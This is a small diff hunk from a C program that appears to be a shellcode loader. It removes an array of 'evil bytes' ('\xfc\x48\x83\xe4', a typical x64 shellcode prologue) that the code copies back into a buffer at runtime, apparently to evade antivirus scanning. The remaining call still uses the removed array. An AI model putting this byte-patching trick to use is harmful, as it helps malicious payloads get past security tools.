@@ -13,10 +13,6 @@ int main()
 
 	unsigned int buf_length = sizeof(buf);
 
-	// make array for evil bytes
-
-	char replace[] = "\xfc\x48\x83\xe4";
-
 	// get them back in
 
 	RtlMoveMemory(buf, replace, 4);
